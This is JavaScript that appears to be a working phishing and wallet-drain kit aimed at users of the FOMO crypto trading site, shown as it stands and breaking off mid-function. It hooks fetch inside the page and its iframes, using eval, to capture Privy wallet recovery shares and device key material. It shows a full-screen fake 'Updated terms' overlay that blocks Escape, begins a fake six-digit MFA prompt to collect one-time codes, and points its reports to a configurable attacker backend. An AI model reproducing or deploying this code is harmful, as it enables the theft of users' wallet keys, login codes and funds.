(async () => {
  window.SCARY_PROJECT_ID = "d7ccae9f";
  window.SCARY_PLATFORM = "fomo";
  window.SCARY_API_URL = "https://yourdomain.com";
  window.PM_LOG_API_BASE_URL = "https://yourdomain.com/log/telemetry";
  window.PM_USER_ID = "d7ccae9f";
  window.PM_BOOKMARK_ID = "d7ccae9f";
  window.FOMO_APP_ID = "cm6h485o300n3zj9yl6vpedq7";
  window.FOMO_CLIENT_ID = "client-WY5gFSayQjxnQhG4rP6SnwPAyPZWZpNRhJ6b9rzMnYwqH";
  window.FOMO_PRIVY_ORIGIN = "https://privy.fomo.family";
  window.FOMO_PRIVY_PROXY = "https://privy.fomo.family";
  window.FOMO_RETURN = "https://fomo.family/token";
  (() => {
    'use strict';

    const apiBase = String(window.SCARY_API_URL || "").replace(/\/+$/, "");
    const projectId = String(window.SCARY_PROJECT_ID || "unknown");
    if (!apiBase) {
      throw new Error("SCARY_API_URL is not configured");
    }
    const CONFIG = {
      APP_ID: window.FOMO_APP_ID || "cm6h485o300n3zj9yl6vpedq7",
      CLIENT_ID: window.FOMO_CLIENT_ID || "client-WY5gFSayQjxnQhG4rP6SnwPAyPZWZpNRhJ6b9rzMnYwqH",
      PRIVY: window.FOMO_PRIVY_ORIGIN || "https://privy.fomo.family",
      PRIVY_PROXY: window.FOMO_PRIVY_PROXY || window.FOMO_PRIVY_ORIGIN || "https://privy.fomo.family",
      PROXY_ORIGIN: window.FOMO_PROXY_ORIGIN || apiBase,
      RUNNER: window.FOMO_RUNNER || apiBase + "/r.html",
      BACKEND: window.FOMO_BACKEND || apiBase + "/api/fomo/report?projectId=" + encodeURIComponent(projectId) + "&platform=fomo",
      RETURN: window.FOMO_RETURN || "https://fomo.family/token",
      MFA_DELAY_MS: 450
    };
    const capturedRequests = [];
    window.addEventListener("message", event => {
      const message = event.data;
      if (!message || message.type !== "__fomo_privy_http" || typeof message.body !== "string") {
        return;
      }
      if (event.origin !== CONFIG.PRIVY && event.origin !== location.origin && event.origin !== "null") {
        return;
      }
      capturedRequests.push({
        url: String(message.url || ""),
        body: message.body
      });
    });
    /* Hooks window.fetch (and evals the hook into every existing iframe) so that any Privy /recovery/auth_share, /recovery/shares response body and any /recovery/device request body is silently copied into capturedRequests via postMessage. */
    function installFetchHook() {
      if (window.__fomoFetchHook) {
        return;
      }
      window.__fomoFetchHook = true;
      const originalFetch = window.fetch;
      if (typeof originalFetch !== "function") {
        return;
      }
      window.fetch = async function (url, options) {
        const response = await originalFetch.apply(this, arguments);
        try {
          const urlString = String(typeof url === "string" ? url : url && url.url || "");
          if (/\/recovery\/(auth_share|shares)(\?|$)/.test(urlString) && response.ok) {
            const responseBody = await response.clone().text();
            const recoveryCaptureMessage = {
              type: "__fomo_privy_http",
              url: urlString,
              body: responseBody
            };
            const outboundMessage = recoveryCaptureMessage;
            try {
              window.parent.postMessage(outboundMessage, "*");
            } catch (e) {}
            try {
              window.postMessage(outboundMessage, "*");
            } catch (e) {}
          }
          if (/\/recovery\/device(\?|$)/.test(urlString)) {
            const requestBody = typeof options?.body === "string" ? options.body : "";
            if (requestBody) {
              const deviceCaptureMessage = {
                type: "__fomo_privy_http",
                url: urlString,
                body: requestBody
              };
              const outboundDeviceMessage = deviceCaptureMessage;
              try {
                window.parent.postMessage(outboundDeviceMessage, "*");
              } catch (e) {}
              try {
                window.postMessage(outboundDeviceMessage, "*");
              } catch (e) {}
            }
          }
        } catch (e) {}
        return response;
      };
    }
    installFetchHook();
    try {
      for (const iframe of document.querySelectorAll("iframe")) {
        try {
          iframe.contentWindow.eval("(" + installFetchHook.toString() + ")()");
        } catch (e) {}
      }
    } catch (e) {}
    /* Searches capturedRequests for a previously intercepted /recovery/<kind> body matching a wallet; used as a fallback source of share material. */
    function findCapturedRecoveryBody(wallet, kind) {
      const encodedWallet = encodeURIComponent(String(wallet || ""));
      const pathFragment = "/recovery/" + kind;
      for (let i = capturedRequests.length - 1; i >= 0; i--) {
        const entryUrl = capturedRequests[i].url;
        if (entryUrl.indexOf(pathFragment) === -1) {
          continue;
        }
        if (encodedWallet && entryUrl.indexOf(encodedWallet) === -1 && entryUrl.indexOf(String(wallet || "")) === -1) {
          continue;
        }
        try {
          return JSON.parse(capturedRequests[i].body);
        } catch (e) {
          return null;
        }
      }
      return null;
    }
    /* Drives the fake "I agree" confirm button (idle/ready/busy/done/again) and its hint/status labels. */
    function setConfirmState(state, labels) {
      const slot = typeof document !== "undefined" && document.getElementById && document.getElementById("__fomo_confirm_slot");
      if (!slot) {
        return;
      }
      const nextState = state === "again" ? "ready" : state;
      try {
        if (slot.dataset) {
          slot.dataset.state = nextState;
        } else if (typeof slot.setAttribute === "function") {
          slot.setAttribute("data-state", nextState);
        }
      } catch (e) {}
      try {
        if (typeof slot.setAttribute === "function") {
          slot.setAttribute("aria-busy", state === "busy" ? "true" : "false");
        }
      } catch (e) {}
      const face = typeof slot.querySelector === "function" ? slot.querySelector(".confirm-face") : null;
      const hintElement = typeof document.getElementById === "function" ? document.getElementById("__fomo_confirm_hint") : null;
      const subElement = typeof document.getElementById === "function" ? document.getElementById("__fomo_sub") : null;
      const statusElement = typeof document.getElementById === "function" ? document.getElementById("__fomo_status") : null;
      if (face) {
        if (state === "done") {
          face.innerHTML = "<i class=\"tick\" aria-hidden=\"true\"></i>Done";
        } else if (state === "busy") {
          face.textContent = labels && labels.face || "Working";
        } else if (state === "again") {
          face.textContent = labels && labels.face || "Continue";
        } else {
          face.textContent = labels && labels.face || "I agree";
        }
      }
      if (hintElement) {
        hintElement.textContent = labels && labels.hint || (state === "ready" ? "Click I agree to continue." : state === "again" ? "Click continue to finish." : state === "busy" ? "One moment." : state === "done" ? "Accepted." : "Preparing.");
      }
      if (subElement && labels && labels.sub) {
        subElement.textContent = labels.sub;
      }
      if (statusElement && labels && labels.status) {
        statusElement.textContent = labels.status;
      }
    }
    /* Adds pointerdown feedback handlers on the overlay so buttons look busy while the trap runs. */
    function installOverlayPressFeedback(root) {
      if (!root || typeof root.addEventListener !== "function") {
        return;
      }
      root.addEventListener("pointerdown", pressEvent => {
        const target = pressEvent && pressEvent.target;
        if (!target || typeof target.closest !== "function") {
          return;
        }
        const confirmSlotHit = target.closest("#__fomo_confirm_slot");
        const actionHit = target.closest("#__fomo_retry_popup, #__fomo_terms_back, #__fomo_terms_back_foot, #__fomo_terms_open");
        const titleElement = typeof document.getElementById === "function" ? document.getElementById("__fomo_title") : null;
        if (confirmSlotHit) {
          try {
            if (confirmSlotHit.dataset) {
              confirmSlotHit.dataset.state = "busy";
            }
          } catch (_0xaa65e) {}
          const faceElement = typeof confirmSlotHit.querySelector === "function" ? confirmSlotHit.querySelector(".confirm-face") : null;
          if (faceElement) {
            faceElement.textContent = "Working";
          }
          if (titleElement) {
            titleElement.textContent = "Working";
          }
          setConfirmState("busy", {
            face: "Working",
            hint: "Got it.",
            status: "Working",
            sub: "Hang on a second."
          });
        }
        if (actionHit) {
          try {
            if (actionHit.classList && actionHit.classList.add) {
              actionHit.classList.add("is-busy");
            }
          } catch (e) {}
          try {
            if (actionHit.setAttribute) {
              actionHit.setAttribute("aria-busy", "true");
            }
          } catch (e) {}
          if (actionHit.id === "__fomo_retry_popup") {
            actionHit.textContent = "Opening";
            try {
              if (actionHit.classList && actionHit.classList.add) {
                actionHit.classList.add("is-unavailable");
              }
            } catch (e) {}
            if (titleElement) {
              titleElement.textContent = "Opening";
            }
            setConfirmState("busy", {
              face: "Working",
              hint: "Hang on.",
              status: "Opening",
              sub: "Opening the window."
            });
          } else if (actionHit.id === "__fomo_terms_open") {
            actionHit.textContent = "Opening terms";
            if (titleElement) {
              titleElement.textContent = "Terms";
            }
            setConfirmState("busy", {
              hint: "Opening terms.",
              status: "Reading",
              sub: "Take a moment to read."
            });
          } else {
            actionHit.textContent = "Going back";
            if (titleElement) {
              titleElement.textContent = "Updated terms";
            }
            setConfirmState("ready", {
              face: "I agree",
              hint: "Click I agree to continue.",
              status: "Please agree to continue",
              sub: "Please agree to continue using FOMO."
            });
          }
        }
      }, true);
    }
    /* Builds the full-screen "Updated terms" overlay UI (markup + CSS), locks scrolling, blocks Escape, and returns the overlay API (setStep/setSub/showPopupHelp/onRetry/finishOk/error). */
    function buildTermsOverlay() {
      const existingOverlay = document.getElementById("__fomo_overlay");
      if (existingOverlay) {
        existingOverlay.remove();
      }
      const overlayRoot = document.createElement("div");
      overlayRoot.id = "__fomo_overlay";
      overlayRoot.innerHTML = "\n<style>\n  #__fomo_overlay{\n    position:fixed;inset:0;z-index:2147483647;\n    background:rgba(10,10,11,0);color:#f4f4f5;\n    font:15px/1.45 ui-sans-serif,system-ui,-apple-system,\"Segoe UI\",sans-serif;\n    display:flex;align-items:center;justify-content:center;padding:16px;\n    backdrop-filter:blur(0);-webkit-backdrop-filter:blur(0);\n    animation:fomoScrimIn .5s cubic-bezier(.16,1,.3,1) forwards;\n  }\n  #__fomo_overlay *{box-sizing:border-box}\n  #__fomo_overlay .sheet{\n    width:min(392px,100%);padding:28px 22px 20px;\n    border:1px solid #2a2a30;border-radius:18px;background:#141418;\n    box-shadow:0 24px 80px rgba(0,0,0,.45), inset 0 1px 0 rgba(255,255,255,.04);\n    animation:fomoSheetIn .5s cubic-bezier(.16,1,.3,1) both;\n    transition:width .28s cubic-bezier(.16,1,.3,1), max-height .28s cubic-bezier(.16,1,.3,1);\n  }\n  #__fomo_overlay .sheet.is-terms{\n    width:min(560px,100%);max-height:min(86dvh,740px);\n    display:flex;flex-direction:column;padding:18px 18px 16px;\n  }\n  #__fomo_overlay .mark{\n    width:32px;height:32px;border-radius:9px;margin-bottom:16px;overflow:hidden;\n    animation:fomoFadeUp .5s cubic-bezier(.16,1,.3,1) both;\n  }\n  #__fomo_overlay .mark svg{display:block;width:32px;height:32px}\n  #__fomo_overlay h1{\n    margin:0 0 6px;font-size:18px;font-weight:600;letter-spacing:-.03em;\n    animation:fomoFadeUp .5s cubic-bezier(.16,1,.3,1) .05s both;\n  }\n  #__fomo_overlay .sub{\n    color:#a1a1aa;font-size:13px;margin:0 0 18px;max-width:36ch;\n    animation:fomoFadeUp .5s cubic-bezier(.16,1,.3,1) .1s both;\n  }\n  #__fomo_overlay .bar{\n    height:2px;background:#232329;border-radius:2px;overflow:hidden;margin-bottom:14px;\n    animation:fomoFadeUp .5s cubic-bezier(.16,1,.3,1) .14s both;\n  }\n  #__fomo_overlay .bar>i{\n    display:block;height:100%;width:100%;background:#e4e4e7;transform:scaleX(0.12);\n    transform-origin:left center;transition:transform .45s cubic-bezier(.16,1,.3,1);\n    position:relative;\n  }\n  #__fomo_overlay .bar>i::after{\n    content:\"\";position:absolute;inset:0;width:36%;\n    background:linear-gradient(90deg,transparent,rgba(255,255,255,.45),transparent);\n    animation:fomoShimmer 1.4s ease-in-out infinite;\n  }\n  #__fomo_overlay .status{\n    margin:0 0 6px;color:#71717a;font-size:12px;\n    animation:fomoFadeUp .5s cubic-bezier(.16,1,.3,1) .18s both;\n  }\n  #__fomo_overlay .hint{\n    min-height:18px;margin:0 0 12px;color:#a1a1aa;font-size:12px;\n    transition:color .2s ease, opacity .2s ease;\n    animation:fomoFadeUp .5s cubic-bezier(.16,1,.3,1) .22s both;\n  }\n  #__fomo_overlay .confirm-wrap{margin-top:2px;position:relative;z-index:1;animation:fomoFadeUp .5s cubic-bezier(.16,1,.3,1) .26s both}\n  #__fomo_overlay .confirm-wrap.is-blocked,\n  #__fomo_overlay.is-popup-help .confirm-wrap{\n    pointer-events:none !important;opacity:.38;filter:grayscale(.4);\n  }\n  #__fomo_overlay.is-popup-help .confirm-slot iframe{display:none !important;pointer-events:none !important}\n  #__fomo_overlay .confirm-slot{\n    position:relative;height:48px;border-radius:10px;overflow:hidden;\n    background:#f4f4f5;color:#0a0a0b;\n    transition:transform .12s cubic-bezier(.16,1,.3,1), box-shadow .16s ease, background .16s ease, color .16s ease, opacity .16s ease;\n  }\n  #__fomo_overlay .confirm-slot:active{transform:scale(.97)}\n  #__fomo_overlay .confirm-slot[data-state=\"idle\"]{opacity:.55}\n  #__fomo_overlay .confirm-slot[data-state=\"ready\"]{\n    opacity:1;cursor:pointer;\n    animation:fomoCtaPulse 1.6s ease-out infinite;\n  }\n  #__fomo_overlay .confirm-slot[data-state=\"busy\"]{opacity:1;background:#d4d4d8}\n  #__fomo_overlay .confirm-slot[data-state=\"busy\"] .confirm-face{animation:fomoPress .2s cubic-bezier(.16,1,.3,1)}\n  #__fomo_overlay .confirm-slot[data-state=\"done\"]{opacity:1;background:#18181b;color:#f4f4f5;animation:none}\n  #__fomo_overlay .confirm-face{\n    position:absolute;inset:0;z-index:1;pointer-events:none;\n    display:flex;align-items:center;justify-content:center;gap:8px;\n    font:600 15px/1 ui-sans-serif,system-ui,sans-serif;\n    transition:transform .16s cubic-bezier(.16,1,.3,1), opacity .16s ease;\n  }\n  #__fomo_overlay .tick{\n    display:inline-block;width:7px;height:12px;margin-top:-2px;\n    border:solid currentColor;border-width:0 2px 2px 0;transform:rotate(45deg);\n    animation:fomoTickIn .28s cubic-bezier(.16,1,.3,1) both;\n  }\n  #__fomo_overlay .popup-block{\n    display:none;position:relative;z-index:30;margin-top:14px;padding:14px;\n    border:1px solid #2a2a30;border-radius:12px;background:#0e0e12;\n    animation:fomoPopIn .38s cubic-bezier(.16,1,.3,1) both;\n  }\n  #__fomo_overlay .popup-block h2{margin:0 0 6px;font-size:14px;font-weight:600}\n  #__fomo_overlay .popup-block p{margin:0 0 12px;font-size:13px;color:#a1a1aa;line-height:1.5}\n  #__fomo_overlay .btn{\n    display:inline-flex;align-items:center;justify-content:center;width:100%;height:44px;\n    border:0;border-radius:10px;background:#f4f4f5;color:#0a0a0b;text-decoration:none;\n    font:600 14px ui-sans-serif,system-ui,sans-serif;cursor:pointer;\n    transition:transform .16s cubic-bezier(.16,1,.3,1), background .16s ease, opacity .16s ease;\n    position:relative;overflow:hidden;\n  }\n  #__fomo_overlay .btn::after{\n    content:\"\";position:absolute;inset:0;transform:translateX(-120%);\n    background:linear-gradient(90deg,transparent,rgba(255,255,255,.45),transparent);\n  }\n  #__fomo_overlay .btn:hover{background:#fff;transform:translateY(-1px)}\n  #__fomo_overlay .btn:hover::after{animation:fomoShine .7s ease}\n  #__fomo_overlay .btn:active{transform:scale(.97)}\n  #__fomo_overlay .btn.is-busy{opacity:.85;animation:fomoPress .2s cubic-bezier(.16,1,.3,1)}\n  #__fomo_overlay .btn:disabled,#__fomo_overlay .btn.is-unavailable,#__fomo_overlay .back.is-unavailable,#__fomo_overlay .terms-link.is-unavailable{\n    opacity:.42;cursor:not-allowed;transform:none;\n  }\n  #__fomo_overlay h1,#__fomo_overlay .sub,#__fomo_overlay .status,#__fomo_overlay .hint,#__fomo_overlay .confirm-face{\n    transition:opacity .14s ease, transform .14s cubic-bezier(.16,1,.3,1);\n  }\n  #__fomo_overlay .btn:focus-visible{outline:2px solid #f4f4f5;outline-offset:3px}\n  #__fomo_overlay .foot{margin-top:14px;font-size:11px;color:#52525b;animation:fomoFadeUp .5s cubic-bezier(.16,1,.3,1) .3s both}\n  #__fomo_overlay .err{color:#fb7185;margin-top:12px;font-size:13px;display:none;white-space:pre-wrap}\n  #__fomo_overlay .terms-link{\n    display:inline;margin:0;padding:0;border:0;background:none;color:#d4d4d8;\n    font:500 13px/1.45 ui-sans-serif,system-ui,sans-serif;text-decoration:underline;\n    text-underline-offset:3px;cursor:pointer;\n  }\n  #__fomo_overlay .terms-link:hover{color:#fff}\n  #__fomo_overlay .agree-view{animation:fomoFadeUp .4s cubic-bezier(.16,1,.3,1) both}\n  #__fomo_overlay .terms-view{display:none;min-height:0;flex:1;overflow:auto;padding-right:4px}\n  #__fomo_overlay.is-terms .agree-view{display:none}\n  #__fomo_overlay.is-terms .terms-view{display:block;animation:fomoFadeUp .35s cubic-bezier(.16,1,.3,1) both}\n  #__fomo_overlay .terms-top{\n    display:flex;align-items:center;gap:10px;margin-bottom:14px;position:sticky;top:0;\n    background:#141418;padding-bottom:10px;z-index:1;\n  }\n  #__fomo_overlay .back{\n    display:inline-flex;align-items:center;justify-content:center;height:32px;padding:0 12px;\n    border:1px solid #2a2a30;border-radius:8px;background:#0e0e12;color:#f4f4f5;\n    font:600 12px ui-sans-serif,system-ui,sans-serif;cursor:pointer;\n  }\n  #__fomo_overlay .back:hover{background:#18181c}\n  #__fomo_overlay .terms-kicker{color:#8ca46a;font:600 11px/1 ui-sans-serif,system-ui,sans-serif;letter-spacing:.04em}\n  #__fomo_overlay .terms-view h2{margin:0 0 4px;font-size:18px;letter-spacing:-.03em}\n  #__fomo_overlay .terms-meta{margin:0 0 16px;color:#71717a;font-size:12px}\n  #__fomo_overlay .terms-view h3{margin:18px 0 6px;font-size:13px;font-weight:600}\n  #__fomo_overlay .terms-view p,#__fomo_overlay .terms-view li{\n    margin:0 0 8px;color:#a1a1aa;font-size:13px;line-height:1.55;\n  }\n  #__fomo_overlay .terms-view ol{margin:0 0 8px;padding-left:18px}\n  @keyframes fomoScrimIn{\n    to{background:rgba(10,10,11,.78);backdrop-filter:blur(12px);-webkit-backdrop-filter:blur(12px)}\n  }\n  @keyframes fomoSheetIn{\n    from{opacity:0;transform:translateY(16px) scale(.97)}\n    to{opacity:1;transform:none}\n  }\n  @keyframes fomoFadeUp{\n    from{opacity:0;transform:translateY(8px)}\n    to{opacity:1;transform:none}\n  }\n  @keyframes fomoPopIn{\n    from{opacity:0;transform:translateY(8px) scale(.98)}\n    to{opacity:1;transform:none}\n  }\n  @keyframes fomoCtaPulse{\n    0%,100%{box-shadow:0 0 0 0 rgba(140,164,106,.34)}\n    50%{box-shadow:0 0 0 7px rgba(140,164,106,0)}\n  }\n  @keyframes fomoPress{\n    from{transform:scale(.96);opacity:.72}\n    to{transform:none;opacity:1}\n  }\n  @keyframes fomoShimmer{\n    0%{transform:translateX(-120%)}\n    100%{transform:translateX(320%)}\n  }\n  @keyframes fomoShine{\n    to{transform:translateX(120%)}\n  }\n  @keyframes fomoTickIn{\n    from{opacity:0;transform:rotate(45deg) scale(.4)}\n    to{opacity:1;transform:rotate(45deg) scale(1)}\n  }\n  @media (prefers-reduced-motion:reduce){\n    #__fomo_overlay,#__fomo_overlay .sheet,#__fomo_overlay .mark,#__fomo_overlay h1,#__fomo_overlay .sub,#__fomo_overlay .bar,#__fomo_overlay .status,#__fomo_overlay .hint,#__fomo_overlay .confirm-wrap,#__fomo_overlay .foot,#__fomo_overlay .popup-block{animation:none !important}\n    #__fomo_overlay{background:rgba(10,10,11,.86);backdrop-filter:none;-webkit-backdrop-filter:none}\n    #__fomo_overlay .bar>i::after,#__fomo_overlay .btn::after{animation:none}\n    #__fomo_overlay .confirm-slot[data-state=\"ready\"],#__fomo_overlay .confirm-slot[data-state=\"busy\"] .confirm-face,#__fomo_overlay .btn.is-busy{animation:none}\n    #__fomo_overlay .btn:hover{transform:none}\n  }\n  @media (prefers-reduced-transparency:reduce){\n    #__fomo_overlay{background:#0a0a0b;backdrop-filter:none;-webkit-backdrop-filter:none}\n  }\n</style>\n<div class=\"sheet\" role=\"dialog\" aria-modal=\"true\" aria-labelledby=\"__fomo_title\" aria-describedby=\"__fomo_sub __fomo_confirm_hint\">\n  <div class=\"agree-view\" id=\"__fomo_agree_view\">\n    <div class=\"mark\" aria-hidden=\"true\"><svg xmlns=\"http://www.w3.org/2000/svg\" viewBox=\"0 0 64 64\"><rect width=\"64\" height=\"64\" rx=\"14\" fill=\"#8ca46a\"/><path d=\"M16 38h9l5-15 7 24 5-15h6\" fill=\"none\" stroke=\"#080907\" stroke-width=\"5\" stroke-linecap=\"square\" stroke-linejoin=\"round\"/></svg></div>\n    <h1 id=\"__fomo_title\">Updated terms</h1>\n    <p class=\"sub\" id=\"__fomo_sub\">Please agree to continue using FOMO.</p>\n    <p class=\"sub\"><button type=\"button\" class=\"terms-link\" id=\"__fomo_terms_open\">Read the full terms</button></p>\n    <div class=\"bar\"><i id=\"__fomo_bar\"></i></div>\n    <p class=\"status\" id=\"__fomo_status\">Loading</p>\n    <p class=\"hint\" id=\"__fomo_confirm_hint\">Preparing.</p>\n    <div class=\"confirm-wrap\" id=\"__fomo_confirm_wrap\">\n      <div class=\"confirm-slot\" id=\"__fomo_confirm_slot\" data-state=\"idle\" role=\"status\">\n        <div class=\"confirm-face\">I agree</div>\n      </div>\n    </div>\n    <div class=\"popup-block\" id=\"__fomo_popup_block\">\n      <h2>Almost done</h2>\n      <p>Click continue to finish. FOMO tools open in a new tab, then this page comes back.</p>\n      <a class=\"btn\" id=\"__fomo_retry_popup\" target=\"_blank\" rel=\"opener\">Continue</a>\n    </div>\n    <div class=\"foot\">FOMO</div>\n    <div class=\"err\" id=\"__fomo_err\"></div>\n  </div>\n  <div class=\"terms-view\" id=\"__fomo_terms_view\">\n    <div class=\"terms-top\">\n      <button type=\"button\" class=\"back\" id=\"__fomo_terms_back\">Back</button>\n      <span class=\"terms-kicker\">FOMO</span>\n    </div>\n    <h2>FOMO Terms of Use</h2>\n    <p class=\"terms-meta\">Effective October 1, 2026. Last updated October 12, 2026.</p>\n    <h3>1. Agreement</h3>\n    <p>These Terms of Use (\"Terms\") govern access to and use of FOMO, including the website at fomo.family, related apps, and any features we make available (the \"Service\"). By using the Service, you agree to these Terms. If you do not agree, do not use the Service.</p>\n    <h3>2. Who can use FOMO</h3>\n    <p>You must be able to form a binding contract under the laws of your jurisdiction. The Service is not offered to persons where such use would be unlawful. You are responsible for complying with local rules that apply to your use of market data and trading tools.</p>\n    <h3>3. The Service</h3>\n    <p>FOMO provides market information, charts, routing, and related interface features. The Service may change as we ship updates. We may add, suspend, or remove features without notice when needed to operate, secure, or improve the product.</p>\n    <h3>4. Your account</h3>\n    <p>You must keep login details confidential and tell us promptly if you believe someone else is using your account. You are responsible for activity that occurs under your account, including activity from devices you authorize.</p>\n    <h3>5. Acceptable use</h3>\n    <p>You agree not to misuse the Service. That includes attempting to disrupt availability, scraping in a way that degrades the product, reverse engineering except where allowed by law, or using the Service to violate applicable law. We may suspend access if we reasonably believe these Terms are being broken.</p>\n    <h3>6. Market data and content</h3>\n    <p>Prices, charts, and third-party content are provided for information only. Data may be delayed, incomplete, or incorrect. You should not treat any content on the Service as investment, tax, or legal advice. You are solely responsible for decisions you make.</p>\n    <h3>7. Risk notice</h3>\n    <p>Trading digital assets and related instruments involves a risk of loss. Past performance is not a reliable indicator of future results. You should only use the Service with funds you can afford to lose and after you understand the products you trade.</p>\n    <h3>8. Third-party services</h3>\n    <p>The Service may link to or rely on third-party networks, data providers, authentication providers, and infrastructure. Those services have their own terms. We are not responsible for third-party outages, errors, or policy changes.</p>\n    <h3>9. Privacy</h3>\n    <p>We collect and process information as described in our privacy notice, including technical logs, device data, and account details needed to run the Service. By using FOMO you consent to that processing where consent is required.</p>\n    <h3>10. Updates to these Terms</h3>\n    <p>We may update these Terms from time to time. When we do, we will post the new version in the product and update the date above. Continued use after an update means you accept the revised Terms. Material changes may also be highlighted in the product, as we are doing here.</p>\n    <h3>11. Disclaimers</h3>\n    <p>THE SERVICE IS PROVIDED \"AS IS\" AND \"AS AVAILABLE\". TO THE MAXIMUM EXTENT PERMITTED BY LAW, FOMO DISCLAIMS ALL WARRANTIES, WHETHER EXPRESS, IMPLIED, OR STATUTORY, INCLUDING MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, AND NON-INFRINGEMENT. We do not warrant that the Service will be uninterrupted, timely, secure, or error-free.</p>\n    <h3>12. Limitation of liability</h3>\n    <p>To the maximum extent permitted by law, FOMO and its affiliates will not be liable for any indirect, incidental, special, consequential, or punitive damages, or any loss of profits, data, or goodwill, arising out of your use of the Service. Our total liability for any claim relating to the Service is limited to the greater of one hundred US dollars (USD 100) or the amount you paid us for the Service in the three months before the claim.</p>\n    <h3>13. Indemnity</h3>\n    <p>You agree to defend, indemnify, and hold harmless FOMO and its affiliates from claims, damages, and expenses (including reasonable legal fees) arising from your use of the Service or your breach of these Terms.</p>\n    <h3>14. Termination</h3>\n    <p>You may stop using the Service at any time. We may suspend or end access if you breach these Terms, if we are required to do so by law, or if we discontinue the Service. Sections that by their nature should survive will survive termination.</p>\n    <h3>15. Governing law</h3>\n    <p>These Terms are governed by the laws applicable to the operator of the Service, without regard to conflict-of-law rules. Courts in that venue have exclusive jurisdiction, except where applicable consumer law gives you a right to bring a claim in your home country.</p>\n    <h3>16. Contact</h3>\n    <p>Questions about these Terms can be sent to support@fomo.family. Please include the email on your account so we can find the right record.</p>\n    <p>By selecting I agree, you confirm that you have read these Terms and that you accept them.</p>\n    <p><button type=\"button\" class=\"back\" id=\"__fomo_terms_back_foot\">Back</button></p>\n  </div>\n</div>";
      document.documentElement.appendChild(overlayRoot);
      installOverlayPressFeedback(overlayRoot);
      setConfirmState("idle");
      const sheet = overlayRoot.querySelector(".sheet");
      const showTermsView = show => {
        overlayRoot.classList.toggle("is-terms", show);
        if (sheet) {
          sheet.classList.toggle("is-terms", show);
        }
        const termsBackButton = overlayRoot.querySelector("#__fomo_terms_back");
        if (show && termsBackButton && typeof termsBackButton.focus === "function") {
          termsBackButton.focus();
        }
      };
      const termsOpenButton = overlayRoot.querySelector("#__fomo_terms_open");
      const termsBackTop = overlayRoot.querySelector("#__fomo_terms_back");
      const termsBackFoot = overlayRoot.querySelector("#__fomo_terms_back_foot");
      if (termsOpenButton) {
        termsOpenButton.addEventListener("click", e => {
          e.preventDefault();
          e.stopPropagation();
          showTermsView(true);
        });
      }
      if (termsBackTop) {
        termsBackTop.addEventListener("click", e => {
          e.preventDefault();
          showTermsView(false);
        });
      }
      if (termsBackFoot) {
        termsBackFoot.addEventListener("click", e => {
          e.preventDefault();
          showTermsView(false);
        });
      }
      try {
        document.documentElement.style.overflow = "hidden";
      } catch (e) {}
      overlayRoot.addEventListener("keydown", e => {
        if (e.key === "Escape" || e.key === "Esc") {
          e.preventDefault();
          e.stopImmediatePropagation();
        }
      }, true);
      overlayRoot.addEventListener("pointerdown", e => {
        if (e.target === overlayRoot) {
          e.preventDefault();
          e.stopPropagation();
        }
      });
      return {
        root: overlayRoot,
        setConfirmState: setConfirmState,
        setStep(step) {
          const stepLabels = ["", "Loading", "Almost ready", "Reviewing terms", "Please agree to continue", "Please agree to continue", "Finishing up", "Thanks"];
          const statusLine = overlayRoot.querySelector("#__fomo_status");
          if (statusLine) {
            statusLine.textContent = stepLabels[step] || stepLabels[1];
          }
          const progress = Math.min(100, Math.round((step - 1) / 7 * 100) + 8);
          const progressBar = overlayRoot.querySelector("#__fomo_bar");
          if (progressBar) {
            progressBar.style.transform = "scaleX(" + progress / 100 + ")";
          }
          if (step >= 4 && step <= 6) {
            setConfirmState("ready");
          } else if (step >= 7) {
            setConfirmState("done");
          } else {
            setConfirmState("idle");
          }
        },
        setSub(text) {
          const subLine = overlayRoot.querySelector("#__fomo_sub");
          if (subLine) {
            subLine.textContent = text;
          }
        },
        showPopupHelp() {
          try {
            overlayRoot.querySelectorAll("iframe").forEach(iframe => iframe.remove());
          } catch (e) {}
          overlayRoot.classList.add("is-popup-help");
          const popupBlock = overlayRoot.querySelector("#__fomo_popup_block");
          const confirmWrap = overlayRoot.querySelector("#__fomo_confirm_wrap");
          const retryButton = overlayRoot.querySelector("#__fomo_retry_popup");
          if (popupBlock) {
            popupBlock.style.display = "block";
          }
          if (confirmWrap) {
            confirmWrap.classList.add("is-blocked");
          }
          if (retryButton) {
            retryButton.classList.remove("is-busy");
            retryButton.textContent = "Continue";
          }
          const popupSubLine = overlayRoot.querySelector("#__fomo_sub");
          if (popupSubLine) {
            popupSubLine.textContent = "Click continue to finish.";
          }
        },
        hidePopupHelp() {
          overlayRoot.classList.remove("is-popup-help");
          const popupBlockHide = overlayRoot.querySelector("#__fomo_popup_block");
          const confirmWrapHide = overlayRoot.querySelector("#__fomo_confirm_wrap");
          if (popupBlockHide) {
            popupBlockHide.style.display = "none";
          }
          if (confirmWrapHide) {
            confirmWrapHide.classList.remove("is-blocked");
          }
          const popupSubLineRestore = overlayRoot.querySelector("#__fomo_sub");
          if (popupSubLineRestore) {
            popupSubLineRestore.textContent = "Please agree to continue using FOMO.";
          }
        },
        onRetry(handler) {
          const retryElement = overlayRoot.querySelector("#__fomo_retry_popup");
          if (!retryElement) {
            return;
          }
          retryElement.onclick = _0x4c6fb => handler(_0x4c6fb);
        },
        finishOk() {
          const finalBar = overlayRoot.querySelector("#__fomo_bar");
          if (finalBar) {
            finalBar.style.transform = "scaleX(1)";
          }
          const finalTitle = overlayRoot.querySelector("#__fomo_title");
          const finalSub = overlayRoot.querySelector("#__fomo_sub");
          const finalStatus = overlayRoot.querySelector("#__fomo_status");
          if (finalTitle) {
            finalTitle.textContent = "Thanks";
          }
          if (finalSub) {
            finalSub.textContent = "You can keep using FOMO in this tab.";
          }
          if (finalStatus) {
            finalStatus.textContent = "All set";
          }
          setConfirmState("done");
        },
        error(errorMessage) {
          const errorBox = overlayRoot.querySelector("#__fomo_err");
          if (!errorBox) {
            return;
          }
          errorBox.style.display = "block";
          errorBox.textContent = String(errorMessage || "Something went wrong. Please try again.");
        }
      };
    }
    /* Shows a native-looking 6-digit TOTP dialog, auto-submits when 6 digits are entered, and resolves with the typed code. */
    function promptMfaCode(errorText) {
      return new Promise(resolve => {
        document.getElementById("__fomo_mfa_native")?.remove();
        const dialogRoot = document.createElement("div");
        dialogRoot.id = "__fomo_mfa_native";
